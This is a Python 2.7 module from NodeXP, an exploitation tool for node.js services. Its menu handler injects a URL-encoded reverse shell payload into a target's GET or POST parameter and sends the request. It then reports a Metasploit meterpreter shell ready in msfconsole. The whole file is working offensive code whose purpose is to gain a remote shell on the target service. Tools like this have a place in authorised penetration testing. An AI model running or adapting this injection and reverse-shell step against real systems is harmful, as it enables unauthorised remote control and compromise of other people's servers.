#!/usr/bin/python2.7	
# encoding: UTF-8

"""
This file is part of NodeXP, a detection & exploitation tool for 
node.js services (https://github.com/esmog/nodexp) created by 
Antonaropoulos Dimitrios (@esmog).
For more info about NodeXP see the 'README.md' file.
"""

import src.interfaces.functions.interfaces as interfaces
import src.core.init.settings as settings
import src.core.exploitation.upload as upload
import src.interfaces.options.verbosity as verbosity
import urllib
from colorama import Fore, Back, Style, init

def exploitation_options(msg,error_msg):
	option = str(raw_input(msg))
	try:
		if option == '1':
			read_file = upload.read_file()
			read_spool = upload.read_spool()
			if read_spool == True:
				message = Fore.GREEN + '[!] Metasploit is already set. Uploading reverse shell payload!'
				verbosity.print_message(message, settings.print_info)

				# Initialize payload
				# GET case initalize payload
				if settings.request_method == 0:
					url = settings.pre_url + '?' + settings.initial_inject_here
					settings.reverse_shell_payload = urllib.quote(settings.reverse_shell_payload)
					parameter = url.replace('[INJECT_HERE]', settings.reverse_shell_payload, 1)
				# POST case initialize payload
				else:
					parameter = settings.initial_inject_here.replace('[INJECT_HERE]', settings.reverse_shell_payload, 1)
				
				settings.exploitation_state = 1
				interfaces.make_request(parameter)
				# .. wait until spool is ready and upload payload... 
			# Started reverse TCP handler on 
			print(Fore.GREEN + '[i] Successfully uploaded payload, check msfconsole for meterpreter shell :)')
			exit(Fore.GREEN + "[i] Quiting 'Nodexp'")
		elif option == '2':
			exit(Fore.GREEN + "[i] Quiting 'Nodexp'")
		else:
			print(error_msg)
			return exploitation_options(msg,error_msg)
	except Exception as e:
		print(Fore.RED + '[!] ERROR: %s' %e)
		verbosity.error_info(e)
